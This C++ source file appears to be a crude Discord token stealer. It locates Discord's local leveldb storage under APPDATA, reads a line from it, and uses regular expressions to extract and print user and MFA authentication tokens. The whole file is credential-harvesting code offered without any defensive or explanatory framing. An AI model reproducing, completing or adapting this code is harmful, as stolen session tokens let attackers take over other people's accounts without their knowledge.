#include <iostream>
#include <fstream>
#include <string>
#include <regex>    
    
using namespace std;
    size_t sz = 0;
    char* szBuf;    
    errno_t environment = _dupenv_s(&szBuf, &sz, "APPDATA");
    string AppData = szBuf;
    string leveldb = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
    string token = "[oken";
    string line;

int main()
{
    smatch smatch;
    try {
        ifstream file(leveldb);

        if (file.is_open()) {
            if (getline(file, line)) {
                cout << line << '\n';
                if (line.find(token, 0) != string::npos) {
                    cout << token << '\n';
                    regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
                    if (regex_search(line, smatch, x) == true) {
                        cout << smatch.str() << '\n';
                    } else {
                        regex y(R"(mfa\.[\w-]{84})");
                        if (regex_search(line, smatch, y) == true) {
                            cout << smatch.str() << '\n';
                        } else {
                            cout << "[REGEX] Not Found" << '\n';
                        }
                    }
                } else{
                    cout << "[TOKEN] Not Found" << '\n';
                }
            } file.close();
        }
        else {
            return 0;
        }
    } catch (exception) {
        return 0;
    }
}
